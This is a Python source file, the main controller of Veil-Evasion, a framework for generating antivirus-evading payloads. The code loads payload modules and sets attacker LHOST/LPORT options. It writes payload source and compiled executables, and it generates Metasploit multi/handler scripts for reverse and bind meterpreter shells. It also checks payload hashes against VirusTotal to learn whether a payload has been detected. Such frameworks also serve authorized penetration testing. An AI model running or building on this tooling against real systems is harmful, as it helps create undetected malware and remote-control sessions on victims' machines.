"""
Contains the main controller object for Veil-Evasion.

"""

# Import Modules
import glob
import imp
import sys
import os
import readline
import re
import socket
import commands
import time
import subprocess
import hashlib
from subprocess import Popen, PIPE


# try to find and import the settings.py config file
if os.path.exists("/etc/veil/settings.py"):
    try:
        sys.path.append("/etc/veil/")
        import settings

        # check for a few updated values to see if we have a new or old settings.py file
        try:
            settings.VEIL_EVASION_PATH
        except AttributeError:
            #os.system('clear')
            print '\n========================================================================='
            print ' New major Veil-Evasion version installed'
            print '========================================================================='
            print '\n [*] Manually run: bash %s -s' % os.path.abspath("setup/setup.sh")
            sys.exit()

    except ImportError:
        print "\n [!] ERROR #1: run %s manually\n" % (os.path.abspath("./config/update.py"))
        sys.exit()
elif os.path.exists("./config/settings.py"):
    try:
        sys.path.append("./config")
        import settings
    except ImportError:
        print "\n [!] ERROR #2: run %s manually\n" % (os.path.abspath("./config/update.py"))
        sys.exit()
else:
    # if the file isn't found, try to run the update script
    #os.system('clear')
    print '\n========================================================================='
    print ' Veil First Run Detected...'
    print '========================================================================='
    print '\n [*] Manually run: bash %s -s' % os.path.abspath("setup/setup.sh")
    sys.exit()


from os.path import join, basename, splitext
from modules.common import messages
from modules.common import helpers
from modules.common import supportfiles
from modules.common import completers


class Controller:
    """
    Principal controller object that's instantiated.

    Loads all payload modules dynamically from ./modules/payloads/* and
    builds store the instantiated payload objects in self.payloads.
    has options to list languages/payloads, manually set payloads,
    generate code, and provides the main interactive
    menu that lists payloads and allows for user ineraction.
    """

    def __init__(self, langs = None, oneRun=True):
        self.payloads = list()
        # a specific payload, so we can set it manually
        self.payload = None
        self.payloadname = None
        # restrict loaded modules to specific languages
        self.langs = langs

        # oneRune signifies whether to only generate one payload, as we would
        # if being invoked from external code.
        # defaults to True, so Veil.py needs to manually specific "False" to
        # ensure an infinite loop
        self.oneRun = oneRun

        self.outputFileName = ""

        self.commands = [   ("use","Use a specific payload"),
                            ("info","Information on a specific payload"),
                            ("list","List available payloads"),
                            ("update","Update Veil-Evasion to the latest version"),
                            ("clean","Clean out payload folders"),
                            ("checkvt","Check payload hashes vs. VirusTotal"),
                            ("exit","Exit Veil-Evasion")]

        self.payloadCommands = [    ("set","Set a specific option value"),
                                    ("info","Show information about the payload"),
                                    ("options","Show payload's options"),
                                    ("generate","Generate payload"),
                                    ("back","Go to the main menu"),
                                    ("exit","exit Veil-Evasion")]

        self.LoadPayloads()


    def LoadPayloads(self):
        """
        Crawl the module path and load up everything found into self.payloads.
        """

        # crawl up to 5 levels down the module path
        for x in xrange(1,5):
            # make the folder structure the key for the module

            d = dict( (path[path.find("payloads")+9:-3], imp.load_source( "/".join(path.split("/")[3:])[:-3],path )  ) for path in glob.glob(join(settings.VEIL_EVASION_PATH+"/modules/payloads/" + "*/" * x,'[!_]*.py')) )

            # instantiate the payload stager
            for name in d.keys():
                module = d[name].Payload()
                self.payloads.append( (name, module) )

        # sort payloads by their key/path name
        self.payloads = sorted(self.payloads, key=lambda x: (x[0]))


    def ListPayloads(self):
        """
        Prints out available payloads in a nicely formatted way.
        """

        print helpers.color("\n [*] Available Payloads:\n")
        lastBase = None
        x = 1
        for (name, payload) in self.payloads:
            parts = name.split("/")
            if lastBase and parts[0] != lastBase:
                print ""
            lastBase = parts[0]
            print "\t%s)\t%s" % (x, '{0: <24}'.format(name))
            x += 1
        print ""


    def UpdateVeil(self, interactive=True):
        """
        Updates Veil by invoking git pull on the OS

        """
        print "\n Updating Veil via git...\n"
        updatecommand = ['git', 'pull']
        updater = subprocess.Popen(updatecommand, cwd=settings.VEIL_EVASION_PATH, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        updoutput, upderr = updater.communicate()

        if interactive:
            raw_input(" [>] Veil updated, press any key to continue.")


    def CheckVT(self, interactive=True):
        """
        Checks payload hashes in veil-output/hashes.txt vs VirusTotal
        """

        # Command for in-menu vt-notify check against hashes within hash file
        # It's only triggered if selected in menu and file isn't empty
        try:
            if os.stat(settings.HASH_LIST)[6] != 0:
                checkVTcommand = "./vt-notify.rb -f " + settings.HASH_LIST + " -i 0"
                print helpers.color("\n [*] Checking Virus Total for payload hashes...\n")
                checkVTout = Popen(checkVTcommand.split(), stdout=PIPE, cwd=settings.VEIL_EVASION_PATH + "tools/vt-notify/")

                found = False
                for line in checkVTout.stdout:
                    if "was found" in line:
                        filehash, filename = line.split()[0].split(":")
                        print helpers.color(" [!] File %s with hash %s found!" %(filename, filehash), warning=True)
                        found = True
                if found == False:
                    print " [*] No payloads found on VirusTotal!"

                raw_input("\n [>] Press any key to continue...")

            else:
                print helpers.color("\n [!] Hash file is empty, generate a payload first!", warning=True)
                raw_input("\n [>] Press any key to continue...")

        except OSError as e:
            print helpers.color("\n [!] Error: hash list %s not found" %(settings.HASH_LIST), warning=True)
            raw_input("\n [>] Press any key to continue...")


    def CleanPayloads(self, interactive=True):
        """
        Cleans out the payload source/compiled/handler folders.
        """

        # prompt for confirmation if we're in the interactive menu
        if interactive:
            choice = raw_input("\n [>] Are you sure you want to clean payload folders? [y/N] ")

            if choice.lower() == "y":
                print "\n [*] Cleaning %s" %(settings.PAYLOAD_SOURCE_PATH)
                os.system('rm -f %s/*.*' %(settings.PAYLOAD_SOURCE_PATH))

                print " [*] Cleaning %s" %(settings.PAYLOAD_COMPILED_PATH)
                os.system('rm -f %s/*.exe' %(settings.PAYLOAD_COMPILED_PATH))

                print " [*] Cleaning %s" %(settings.HANDLER_PATH)
                os.system('rm -f %s/*.rc' %(settings.HANDLER_PATH))

                print " [*] cleaning %s" %(settings.HASH_LIST)
                os.system('rm -f %s' %(settings.HASH_LIST))
                os.system('touch ' + settings.HASH_LIST)

                print " [*] cleaning ./tools/vt-notify/results.log"
                os.system('rm -f ./tools/vt-notify/results.log')

                choice = raw_input("\n [>] Folders cleaned, press any key to return to the main menu.")

        else:
            print "\n [*] Cleaning %s" %(settings.PAYLOAD_SOURCE_PATH)
            os.system('rm -f %s/*.*' %(settings.PAYLOAD_SOURCE_PATH))

            print " [*] Cleaning %s" %(settings.PAYLOAD_COMPILED_PATH)
            os.system('rm -f %s/*.exe' %(settings.PAYLOAD_COMPILED_PATH))

            print " [*] Cleaning %s" %(settings.HANDLER_PATH)
            os.system('rm -f %s/*.rc' %(settings.HANDLER_PATH))

            print " [*] cleaning %s" %(settings.HASH_LIST)
            os.system('rm -f %s' %(settings.HASH_LIST))
            os.system('touch ' + settings.HASH_LIST)

            print "\n [*] Folders cleaned\n"

    def PayloadOptions(self, payload):
        print helpers.color("\n Required Options:\n")

        print " Name\t\t\tCurrent Value\tDescription"
        print " ----\t\t\t-------------\t-----------"

        # sort the dictionary by key before we output, so it looks nice
        for key in sorted(self.payload.required_options.iterkeys()):
            print " %s\t%s\t%s" % ('{0: <16}'.format(key), '{0: <8}'.format(payload.required_options[key][0]), payload.required_options[key][1])

        print ""

    def PayloadInfo(self, payload, showTitle=True, showInfo=True):
        """
        Print out information about a specified payload.

        payload = the payload object to print information on
        showTitle = whether to show the Veil title
        showInfo = whether to show the payload information bit

        """
        if showTitle:
            if settings.TERMINAL_CLEAR != "false": messages.title()

        if showInfo:
            # extract the payload class name from the instantiated object, then chop off the load folder prefix
            payloadname = "/".join(str(str(payload.__class__)[str(payload.__class__).find("payloads"):]).split(".")[0].split("/")[1:])

            print helpers.color(" Payload information:\n")
            print "\tName:\t\t" + payloadname
            print "\tLanguage:\t" + payload.language
            print "\tRating:\t\t" + payload.rating

            if hasattr(payload, 'shellcode'):
                if self.payload.shellcode.customshellcode:
                    print "\tShellcode:\t\tused"

            # format this all nice-like
            print helpers.formatLong("Description:", payload.description)

        # if required options were specified, output them
        if hasattr(self.payload, 'required_options'):
            self.PayloadOptions(self.payload)

    def SetPayload(self, payloadname, options):
        """
        Manually set the payload for this object with specified options.

        name = the payload to set, ex: c/meter/rev_tcp
        options = dictionary of required options for the payload, ex:
                options['customShellcode'] = "\x00..."
                options['required_options'] = {"compile_to_exe" : ["Y", "Compile to an executable"], ...}
                options['msfvenom'] = ["windows/meterpreter/reverse_tcp", ["LHOST=192.168.1.1","LPORT=443"]
        """

        # iterate through the set of loaded payloads, trying to find the specified payload name
        for (name, payload) in self.payloads:

            if payloadname.lower() == name.lower():

                # set the internal payload variable
                self.payload = payload
                self.payloadname = name

            # did they enter a number rather than the full payload?
            elif payloadname.isdigit() and 0 < int(payloadname) <= len(self.payloads):
                x = 1
                for (name, pay) in self.payloads:
                    # if the entered number matches the payload #, use that payload
                    if int(payloadname) == x:
                        self.payload = pay
                        self.payloadname = name
                    x += 1

        print " Payload: %s\n" % helpers.color(self.payloadname)

        # if payload is found, then go ahead
        if self.payload:

            # options['customShellcode'] = "\x00..."
            if 'customShellcode' in options:
                self.payload.shellcode.setCustomShellcode(options['customShellcode'])
            # options['required_options'] = {"compile_to_exe" : ["Y", "Compile to an executable"], ...}
            if 'required_options' in options:
                try:
                    for k,v in options['required_options'].items():
                        self.payload.required_options[k] = v
                except:
                    print helpers.color("\n [!] Internal error #4.", warning=True)
            # options['msfvenom'] = ["windows/meterpreter/reverse_tcp", ["LHOST=192.168.1.1","LPORT=443"]
            if 'msfvenom' in options:
                if hasattr(self.payload, 'shellcode'):
                    self.payload.shellcode.SetPayload(options['msfvenom'])
                else:
                    print helpers.color("\n [!] Internal error #3: This module does not use msfvenom!", warning=True)
                    sys.exit()

            if not self.ValidatePayload(self.payload):

                print helpers.color("\n [!] WARNING: Not all required options filled\n", warning=True)
                self.PayloadOptions(self.payload)
                print ''
                sys.exit()

        # if a payload isn't found, then list available payloads and exit
        else:

            print helpers.color(" [!] Invalid payload selected\n\n", warning=True)
            self.ListPayloads()
            sys.exit()


    def ValidatePayload(self, payload):
        """
        Check if all required options are filled in.

        Returns True if valid, False otherwise.
        """

        # don't worry about shellcode - it validates itself


        # validate required options if present
        if hasattr(payload, 'required_options'):
            for key in sorted(self.payload.required_options.iterkeys()):
                if payload.required_options[key][0] == "":
                    return False

        return True


    def GeneratePayload(self):
        """
        Calls self.payload.generate() to generate payload code.

        Returns string of generated payload code.
        """
        return self.payload.generate()


    def OutputMenu(self, payload, code, showTitle=True, interactive=True, args=None):
        """
        Write a chunk of payload code to a specified ouput file base.
        Also outputs a handler script if required from the options.

        code = the source code to write
        OutputBaseChoice = "payload" or user specified string

        Returns the full name the source was written to.
        """

        OutputBaseChoice = ""
        overwrite = False

        # if we have arguments passed, extract out the values we want
        if args:
            OutputBaseChoice = args.o
            overwrite = args.overwrite

        # if we get .exe or ELF (with no base) code back, output to the compiled folder, otherwise write to the source folder
        if payload.extension == "exe" or payload.extension == "war":
            outputFolder = settings.PAYLOAD_COMPILED_PATH
        # Check for ELF binary
        elif hasattr(payload, 'type') and payload.type == "ELF":
            outputFolder = settings.PAYLOAD_COMPILED_PATH
        else:
            outputFolder = settings.PAYLOAD_SOURCE_PATH

        # only show get input if we're doing the interactive menu
        if interactive:
            if showTitle:
                if settings.TERMINAL_CLEAR != "false": messages.title()

            # Get the base install name for the payloads (i.e. OutputBaseChoice.py/OutputBaseChoice.exe)
            OutputBaseChoice = raw_input("\n [>] Please enter the base name for output files (default is 'payload'): ")

            # ensure we get a base name and not a full path
            while OutputBaseChoice != "" and "/" in OutputBaseChoice:
                print helpers.color(" [!] Please provide a base name, not a path, for the output base", warning=True)
                OutputBaseChoice = raw_input("\n [>] Please enter the base name for output files (default is 'payload'): ")

        # for invalid output base choices that are passed by arguments
        else:
            if "/" in OutputBaseChoice:
                print helpers.color(" [!] Please provide a base name, not a path, for the output base", warning=True)
                print helpers.color(" [!] Defaulting to 'payload' for output base...", warning=True)
                OutputBaseChoice = "payload"

        if OutputBaseChoice == "": OutputBaseChoice = "payload"

        # if we are overwriting, this is the base choice used
        FinalBaseChoice = OutputBaseChoice

        # if we're not overwriting output files, walk the existing and increment
        if not overwrite:
            # walk the output path and grab all the file bases, disregarding extensions
            fileBases = []
            for (dirpath, dirnames, filenames) in os.walk(outputFolder):
                fileBases.extend(list(set([x.split(".")[0] for x in filenames if x.split(".")[0] != ''])))
                break

            # as long as the file exists, increment a counter to add to the filename
            # i.e. "payload3.py", to make sure we don't overwrite anything
            FinalBaseChoice = OutputBaseChoice
            x = 1
            while FinalBaseChoice in fileBases:
                FinalBaseChoice = OutputBaseChoice + str(x)
                x += 1

        # set the output name to /outout/source/BASENAME.EXT unless it is an ELF then no extension
        if hasattr(payload, 'type') and payload.type == "ELF":
            OutputFileName = outputFolder + FinalBaseChoice + payload.extension
        else:
            OutputFileName = outputFolder + FinalBaseChoice + "." + payload.extension

        OutputFile = open(OutputFileName, 'w')
        OutputFile.write(code)
        OutputFile.close()

        # start building the information string for the generated payload
        # extract the payload class name from the instantiated object, then chop off the load folder prefix
        payloadname = "/".join(str(str(payload.__class__)[str(payload.__class__).find("payloads"):]).split(".")[0].split("/")[1:])
        message = "\n Language:\t\t"+helpers.color(payload.language)+"\n Payload:\t\t"+payloadname
        handler = ""

        if hasattr(payload, 'shellcode'):
            # check if msfvenom was used or something custom, print appropriately
            if payload.shellcode.customshellcode != "":
                message += "\n Shellcode:\t\tcustom"
            else:
                message += "\n Shellcode:\t\t" + payload.shellcode.msfvenompayload

                # if the shellcode wasn't custom, build out a handler script
                handler = "use exploit/multi/handler\n"
                handler += "set PAYLOAD " + payload.shellcode.msfvenompayload + "\n"

                # extract LHOST if it's there
                p = re.compile('LHOST=(.*?) ')
                parts = p.findall(payload.shellcode.msfvenomCommand)
                if len(parts) > 0:
                    handler += "set LHOST " + parts[0] + "\n"
                else:
                    # try to extract this local IP
                    handler += "set LHOST " + helpers.LHOST() + "\n"

                # extract LPORT if it's there
                p = re.compile('LPORT=(.*?) ')
                parts = p.findall(payload.shellcode.msfvenomCommand)
                if len(parts) > 0:
                    handler += "set LPORT " + parts[0] + "\n"

                # Removed autoscript smart migrate due to users on forum saying that migrate itself caused detection
                # in an otherwise undetectable (at the time) payload
                handler += "set ExitOnSession false\n"
                handler += "exploit -j\n"

            # print out any msfvenom options we used in shellcode generation if specified
            if len(payload.shellcode.options) > 0:
                message += "\n Options:\t\t"
                parts = ""
                for option in payload.shellcode.options:
                    parts += ' ' + option + ' '
                message += parts.strip()

            # reset the internal shellcode state the options don't persist
            payload.shellcode.Reset()

        # if required options were specified, output them
        if hasattr(payload, 'required_options'):
            t = ""
            # sort the dictionary by key before we output, so it looks nice
            for key in sorted(payload.required_options.iterkeys()):
                t += " " + key + "=" + payload.required_options[key][0] + " "
            message += "\n" + helpers.formatLong("Required Options:", t.strip(), frontTab=False, spacing=24)

            # check if any options specify that we should build a handler out
            keys = payload.required_options.keys()

            # assuming if LHOST is set, we need a handler script
            if "LHOST" in keys or "RHOST" in keys:

                handler = "use exploit/multi/handler\n"
                # do our best to determine the payload type

                architecture = ""
                if hasattr(payload, "architecture") and payload.architecture == "64":
                    architecture = "x64/"


                # handle options from the backdoor factory
                if "payload" in keys:
                    p = payload.required_options["payload"][0]

                    if "rev_tcp" in p:
                        handler += "set PAYLOAD windows/%smeterpreter/reverse_tcp\n" % architecture
                    elif "bind_tcp" in p:
                        handler += "set PAYLOAD windows/%smeterpreter/bind_tcp\n" % architecture
                    elif "https" in p:
                        handler += "set PAYLOAD windows/%smeterpreter/reverse_https\n" % architecture
                    elif "shell" in  p:
                        handler += "set PAYLOAD windows/%sshell_reverse_tcp\n" % architecture
                    else: pass

                # if not BDF, try to extract the handler type from the payload name
                else:
                    # extract the payload class name from the instantiated object, then chop off the load folder prefix
                    payloadname = "/".join(str(str(payload.__class__)[str(payload.__class__).find("payloads"):]).split(".")[0].split("/")[1:])

                    # pure rev_tcp stager
                    if "rev_tcp" in payloadname.lower():
                        handler += "set PAYLOAD windows/%smeterpreter/reverse_tcp\n" % architecture
                    # pure bind_tcp stager
                    elif "bind_tcp" in payloadname.lower():
                        handler += "set PAYLOAD windows/%smeterpreter/bind_tcp\n" % architecture
                    # pure rev_https stager
                    elif "https" in payloadname.lower():
                        handler += "set PAYLOAD windows/%smeterpreter/reverse_https\n" % architecture
                    # pure rev_http stager
                    elif "http" in payloadname.lower():
                        handler += "set PAYLOAD windows/%smeterpreter/reverse_http\n" % architecture
                    else: pass

                # grab the LHOST value
                if "LHOST" in keys:
                    handler += "set LHOST " + payload.required_options["LHOST"][0] + "\n"
                if "RHOST" in keys:
                    handler += "set RHOST " + payload.required_options["RHOST"][0] + "\n"

                # grab the LPORT value if it was set
                if "LPORT" in keys:
                    handler += "set LPORT " + payload.required_options["LPORT"][0] + "\n"

                # grab the LURI value if it was set. ignore the / as that is the default
                if "LURI" in keys and payload.required_options["LURI"][0] != "/":
                    handler += "set LURI " + payload.required_options["LURI"][0] + "\n"

                handler += "set ExitOnSession false\n"
                handler += "exploit -j\n"

        message += "\n Payload File:\t\t"+OutputFileName + "\n"

        # if we're generating the handler script, write it out
        try:
            if settings.GENERATE_HANDLER_SCRIPT.lower() == "true":
                if handler != "":
                    handlerFileName = settings.HANDLER_PATH + FinalBaseChoice + "_handler.rc"
                    handlerFile = open(handlerFileName, 'w')
                    handlerFile.write(handler)
                    handlerFile.close()
                    message += " Handler File:\t\t"+handlerFileName + "\n"
        except:
            # is that option fails, it probably means that the /etc/veil/settings.py file hasn't been updated
            print helpers.color("\n [!] Internal error #1. Please run %s manually\n" % (os.path.abspath("./config/update.py")), warning=True)

        # print out notes if set
        if hasattr(payload, 'notes'):
            #message += " Notes:\t\t\t" + payload.notes
            message += helpers.formatLong("Notes:", payload.notes, frontTab=False, spacing=24)

        # check if compile_to_exe is in the required options, if so,
        # call supportfiles.supportingFiles() to compile appropriately
        if hasattr(self.payload, 'required_options') and self.payload.language.lower() != "powershell":
            if "COMPILE_TO_EXE" in self.payload.required_options:
                value = self.payload.required_options['COMPILE_TO_EXE'][0].lower()[0]

                if value == "y" or value==True:

                    # check if the --pwnstaller flag was passed
                    if args and args.pwnstaller:
                        supportfiles.supportingFiles(self.payload, OutputFileName, {'method':'pwnstaller'})
                    else:
                        # if interactive, allow the user to choose the method
                        if interactive:
                            supportfiles.supportingFiles(self.payload, OutputFileName, {})
                        # otherwise specify the default, pyinstaller
                        else:
                            supportfiles.supportingFiles(self.payload, OutputFileName, {'method':'pyinstaller'})

                    # if we're compiling, set the returned file name to the output .exe
                    # so we can return this for external calls to the framework
                    OutputFileName = settings.PAYLOAD_COMPILED_PATH + FinalBaseChoice + ".exe"

        # This block of code is going to be used to SHA1 hash our compiled payloads to potentially submit the
        # hash with VTNotify to detect if it's been flagged
        try:
            CompiledHashFile = settings.HASH_LIST
            HashFile = open(CompiledHashFile, 'a')
            OutputFile = open(OutputFileName, 'rb')
            Sha1Hasher = hashlib.sha1()
            Sha1Hasher.update(OutputFile.read())
            SHA1Hash = Sha1Hasher.hexdigest()
            OutputFile.close()
            HashFile.write(SHA1Hash + ":" + FinalBaseChoice + "\n")
            HashFile.close()

            # print the full message containing generation notes
            print message

            # print the end message
            messages.endmsg()
        except:
            # if that option fails, it probably means that the /etc/veil/settings.py file hasn't been updated
            print helpers.color("\n [!] Internal error #2. Unable to generate output. Please run %s manually\n" % (os.path.abspath("./config/update.py")), warning=True)

        if interactive:
            raw_input(" [>] Press any key to return to the main menu.")
            print ""
            self.MainMenu(showMessage=True)

        return OutputFileName


    def PayloadMenu(self, payload, showTitle=True, args=None):
        """
        Main menu for interacting with a specific payload.

        payload = the payload object we're interacting with
        showTitle = whether to show the main Veil title menu

        Returns the output of OutputMenu() (the full path of the source file or compiled .exe)
        """

        comp = completers.PayloadCompleter(self.payloadCommands, self.payload)
        readline.set_completer_delims(' \t\n;')
        readline.parse_and_bind("tab: complete")
        readline.set_completer(comp.complete)

        # show the title if specified
        if showTitle:
            if settings.TERMINAL_CLEAR != "false": messages.title()

        # extract the payload class name from the instantiated object
        # YES, I know this is a giant hack :(
        # basically need to find "payloads" in the path name, then build
        # everything as appropriate
        payloadname = "/".join(str(str(payload.__class__)[str(payload.__class__).find("payloads"):]).split(".")[0].split("/")[1:])
        print "\n Payload: " + helpers.color(payloadname) + " loaded\n"

        self.PayloadInfo(payload, showTitle=False, showInfo=False)
        messages.helpmsg(self.payloadCommands, showTitle=False)

        choice = ""
        while choice == "":

            while True:

                choice = raw_input(" [%s>>]: " % payloadname).strip()

                if choice != "":

                    parts = choice.strip().split()
                    cmd = parts[0].lower()

                    # display help menu for the payload
                    if cmd == "info":
                        self.PayloadInfo(payload)
                        choice = ""
                    if cmd == "help":
                        messages.helpmsg(self.payloadCommands)
                        choice = ""
                    # head back to the main menu
                    if cmd == "main" or cmd == "back" or cmd == "home":
                        #finished = True
                        return ""
                        #self.MainMenu()
                    if cmd == "exit" or cmd == "end" or cmd == "quit":
                        raise KeyboardInterrupt
                    # Update Veil via git
                    if cmd == "update":
                        self.UpdateVeil()
                    # set specific options
                    if cmd == "set":

                        # catch the case of no value being supplied
                        if len(parts) == 1:
                            print helpers.color(" [!] ERROR: no value supplied\n", warning=True)

                        else:

                            option = parts[1].upper()
                            value = "".join(parts[2:])

                            #### VALIDATION ####

                            # validate LHOST
                            if option == "LHOST":
                                if '.' in value:
                                    hostParts = value.split(".")

                                    if len(hostParts) > 1:

                                        # if the last chunk is a number, assume it's an IP address
                                        if hostParts[-1].isdigit():
                                            # do a regex IP validation
                                            if not re.match(r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$",value):
                                                print helpers.color("\n [!] ERROR: Bad IP address specified.\n", warning=True)
                                            else:
                                                try:
                                                    payload.required_options[option][0] = value
                                                    print " [i] %s => %s" % (option, value)
                                                except KeyError:
                                                    print helpers.color("\n [!] ERROR #1: Specify LHOST value in the following screen.\n", warning=True)
                                                except AttributeError:
                                                    print helpers.color("\n [!] ERROR #2: Specify LHOST value in the following screen.\n", warning=True)

                                        # assume we've been passed a domain name
                                        else:
                                            if helpers.isValidHostname(value):
                                                payload.required_options[option][0] = value
                                                print " [i] %s => %s" % (option, value)
                                            else:
                                                print helpers.color("\n [!] ERROR: Bad hostname specified.\n", warning=True)

                                    else:
                                        print helpers.color("\n [!] ERROR: Bad IP address or hostname specified.\n", warning=True)

                                elif ':' in value:
                                    try:
                                        socket.inet_pton(socket.AF_INET6, value)
                                        payload.required_options[option][0] = value
                                        print " [i] %s => %s" % (option, value)
                                    except socket.error:
                                        print helpers.color("\n [!] ERROR: Bad IP address or hostname specified.\n", warning=True)
                                        value = ""

                                else:
                                    print helpers.color("\n [!] ERROR: Bad IP address or hostname specified.\n", warning=True)
                                    value = ""

                            # validate LPORT
                            elif option  == "LPORT":
                                try:
                                    if int(value) <= 0 or int(value) >= 65535:
                                        print helpers.color("\n [!] ERROR: Bad port number specified.\n", warning=True)
                                    else:
                                        try:
                                            payload.required_options[option][0] = value
                                            print " [i] %s => %s" % (option, value)
                                        except KeyError:
                                            print helpers.color("\n [!] ERROR: Specify LPORT value in the following screen.\n", warning=True)
                                        except AttributeError:
                                            print helpers.color("\n [!] ERROR: Specify LPORT value in the following screen.\n", warning=True)
                                except ValueError:
                                    print helpers.color("\n [!] ERROR: Bad port number specified.\n", warning=True)

                            # set the specific option value if not validation done
                            else:
                                try:
                                    payload.required_options[option][0] = value
                                    print " [*] %s => %s" % (option, value)
                                except:
                                    print helpers.color(" [!] ERROR: Invalid value specified.\n", warning=True)
                                    cmd = ""

                    # generate the payload
                    if cmd == "generate" or cmd == "gen" or cmd == "run" or cmd == "go" or cmd == "do" or cmd == "make":

                        # make sure all required options are filled in first
                        if self.ValidatePayload(payload):

                            #finished = True
                            # actually generate the payload code
                            payloadCode = payload.generate()

                            # ensure we got some code back
                            if payloadCode != "":
                                # call the output menu
                                return self.OutputMenu(payload, payloadCode, args=args)

                        else:
                            print helpers.color("\n [!] WARNING: not all required options filled\n", warning=True)
                    if cmd == "options":
                        # if required options were specified, output them
                        if hasattr(self.payload, 'required_options'):
                            self.PayloadOptions(self.payload)


    def MainMenu(self, showMessage=True, args=None):
        """
        Main interactive menu for payload generation.

        showMessage = reset the screen and show the greeting message [default=True]
        oneRun = only run generation once, returning the path to the compiled executable
            used when invoking the framework from an external source
        """

        self.outputFileName = ""
        cmd = ""

        try:
            while cmd == "" and self.outputFileName == "":

                # set out tab completion for the appropriate modules on each run
                # as other modules sometimes reset this
                comp = completers.MainMenuCompleter(self.commands, self.payloads)
                readline.set_completer_delims(' \t\n;')
                readline.parse_and_bind("tab: complete")
                readline.set_completer(comp.complete)

                if showMessage:
                    # print the title, where we are, and number of payloads loaded
                    if settings.TERMINAL_CLEAR != "false": messages.title()
                    print " Main Menu\n"
                    print "\t" + helpers.color(str(len(self.payloads))) + " payloads loaded\n"
                    messages.helpmsg(self.commands, showTitle=False)
                    showTitle=False

                cmd = raw_input(' [menu>>]: ').strip()

                # handle our tab completed commands
                if cmd.startswith("help"):
                    if settings.TERMINAL_CLEAR != "false": messages.title()
                    cmd = ""
                    showMessage=False

                elif cmd.startswith("use"):

                    if len(cmd.split()) == 1:
                        if settings.TERMINAL_CLEAR != "false": messages.title()
                        self.ListPayloads()
                        showMessage=False
                        cmd = ""

                    elif len(cmd.split()) == 2:

                        # pull out the payload/number to use
                        p = cmd.split()[1]

                        # if we're choosing the payload by numbers
                        if p.isdigit() and 0 < int(p) <= len(self.payloads):
                            x = 1
                            for (name, pay) in self.payloads:
                                # if the entered number matches the payload #, use that payload
                                if int(p) == x:
                                    self.payload = pay
                                    self.payloadname = name
                                    self.outputFileName = self.PayloadMenu(self.payload, args=args)
                                x += 1

                        # else choosing the payload by name
                        else:
                            for (payloadName, pay) in self.payloads:
                                # if we find the payload specified, kick off the payload menu
                                if payloadName == p:
                                    self.payload = pay
                                    self.payloadname = payloadName
                                    self.outputFileName = self.PayloadMenu(self.payload, args=args)

                        cmd = ""
                        if settings.TERMINAL_CLEAR != "false": showMessage = True

                    # error catchings if not of form [use BLAH]
                    else:
                        cmd = ""
                        showMessage=False

                elif cmd.startswith("update"):
                    self.UpdateVeil()
                    if settings.TERMINAL_CLEAR != "false": showMessage = True
                    cmd = ""

                elif cmd.startswith("checkvt"):
                    self.CheckVT()
                    if settings.TERMINAL_CLEAR != "false": showMessage = True
                    cmd = ""

                # clean payload folders
                if cmd.startswith("clean"):
                    self.CleanPayloads()
                    if settings.TERMINAL_CLEAR != "false": showMessage = True
                    cmd = ""

                elif cmd.startswith("info"):

                    if len(cmd.split()) == 1:
                        if settings.TERMINAL_CLEAR != "false": showMessage = True
                        cmd = ""

                    elif len(cmd.split()) == 2:

                        # pull out the payload/number to use
                        p = cmd.split()[1]

                        # if we're choosing the payload by numbers
                        if p.isdigit() and 0 < int(p) <= len(self.payloads):
                            x = 1
                            for (name, pay) in self.payloads:
                                # if the entered number matches the payload #, use that payload
                                if int(p) == x:
                                    self.payload = pay
                                    self.payloadname = name
                                    self.PayloadInfo(self.payload)
                                x += 1

                        # else choosing the payload by name
                        else:
                            for (payloadName, pay) in self.payloads:
                                # if we find the payload specified, kick off the payload menu
                                if payloadName == p:
                                    self.payload = pay
                                    self.payloadname = payloadName
                                    self.PayloadInfo(self.payload)

                        cmd = ""
                        showMessage=False

                    # error catchings if not of form [use BLAH]
                    else:
                        cmd = ""
                        showMessage=False

                elif cmd.startswith("list") or cmd.startswith("ls"):

                    if len(cmd.split()) == 1:
                        if settings.TERMINAL_CLEAR != "false": messages.title()
                        self.ListPayloads()

                    cmd = ""
                    showMessage=False

                elif cmd.startswith("exit") or cmd.startswith("q"):
                    if self.oneRun:
                        # if we're being invoked from external code, just return
                        # an empty string on an exit/quit instead of killing everything
                        return ""
                    else:
                        print helpers.color("\n [!] Exiting...\n", warning=True)
                        sys.exit()

                # select a payload by just the number
                elif cmd.isdigit() and 0 < int(cmd) <= len(self.payloads):
                    x = 1
                    for (name, pay) in self.payloads:
                        # if the entered number matches the payload #, use that payload
                        if int(cmd) == x:
                            self.payload = pay
                            self.payloadname = name
                            self.outputFileName = self.PayloadMenu(self.payload, args=args)
                        x += 1
                    cmd = ""
                    if settings.TERMINAL_CLEAR != "false": showMessage = True

                # if nothing is entered
                else:
                    cmd = ""
                    showMessage=False

                # if we're looping forever on the main menu (Veil.py behavior)
                # reset the output filname to nothing so we don't break the while
                if not self.oneRun:
                    self.outputFileName = ""

            return self.outputFileName

        # catch any ctrl + c interrupts
        except KeyboardInterrupt:
            if self.oneRun:
                # if we're being invoked from external code, just return
                # an empty string on an exit/quit instead of killing everything
                return ""
            else:
                print helpers.color("\n\n [!] Exiting...\n", warning=True)
                sys.exit()
